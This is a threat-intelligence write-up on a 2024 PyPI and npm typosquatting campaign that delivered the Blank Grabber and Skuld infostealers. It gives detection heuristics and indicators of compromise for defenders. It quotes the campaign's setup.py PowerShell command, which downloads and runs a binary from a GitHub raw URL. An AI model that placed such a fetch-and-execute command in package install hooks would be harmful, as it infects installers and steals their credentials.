---
type: AttackPattern
description: One campaign across 42 typosquatted PyPI and 18 npm packages: obfuscated npm loaders beside plain setup.py hooks that shell out to PowerShell for Blank Grabber and Skuld infostealers (Datadog, Oct 2024).
tags: [auto-executing-install-hook]
---
# MUT-8694 / MUT-8964 (Datadog, Oct 2024)

## Carrier
42 typosquatted PyPI packages and 18 npm packages published as one campaign, first surfaced by
`larpexodus` on PyPI on 10 October 2024. Other PyPI names include `pyadd`, `cblines`, and
`pysolara`; on npm, `nodelogic`, `roblox.dll`, and `bloxbootstrap`. Datadog recorded it as the
first time it had seen a single actor coordinate across two package ecosystems at once, which
means a scanner covering only one registry sees half the campaign

## Technique
effort is deliberately asymmetric within the same campaign. The npm loaders are run through
obfuscator.io with control-flow flattening, dead-code injection, and string encoding, while the
PyPI `setup.py` install hooks are left completely unobfuscated. The Python side simply shells
out at install time:
`powershell -Command "Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '<path>'"`
followed by `Start-Process`. GitHub raw URLs host the second stage, so the fetch reaches a
domain most allowlists already trust

## Payload/effect
two Windows infostealers. Blank Grabber takes Roblox cookies, crypto wallets, browser passwords,
and Telegram sessions, and disables Windows Defender through PowerShell. Skuld Stealer, written in
Go, targets Discord tokens and browser credentials, with virtual-machine detection and other
evasion. A second binary, `LoPi.exe`, was served from the same repository path

## Detectable signal
The shape, which catches a variant sharing no text with this incident:
- a Python install hook shelling out to a system shell: `setup.py` or `setup.cfg` calling
  `subprocess`, `os.system`, or `os.popen` with `powershell`, `-enc`, `-EncodedCommand`, `iwr`,
  `iex`, `Invoke-WebRequest`, `curl`, or `bash -c`
- an install-time fetch of a compiled binary from a code-hosting raw URL: a trusted domain is what
  gets the request past an allowlist, so the host being reputable is not evidence of anything
- a bundle far more obfuscated than its stated purpose warrants: control-flow flattening, `_0x`
  hex identifiers, or string-array encoding in a package claiming to be a small utility
- the same second-stage URL, binary name, or account appearing in packages on two different
  registries: one actor, and covering one registry sees half of it

Literals from this incident, which confirm a replay but will not find a new one:
- `larpexodus`, `pyadd`, `cblines`, `pysolara`, `nodelogic`, `roblox.dll`, `bloxbootstrap`
- `holdthatcode`, `CBLines.exe`, `LoPi.exe`

## Sources
- https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/
- https://securitylabs.datadoghq.com/articles/2024-q4-threat-roundup/
